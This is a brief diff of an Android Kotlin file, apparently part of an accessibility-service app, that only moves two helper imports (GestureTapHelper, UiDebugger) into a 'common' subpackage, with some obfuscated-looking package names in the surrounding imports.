@@ -15,8 +15,8 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.storm.safe.rock.iuzxujjtqev
-import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
-import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
+import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
+import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
 import com.storm.safe.rock.service.modules.automation.A11yWindowResolver
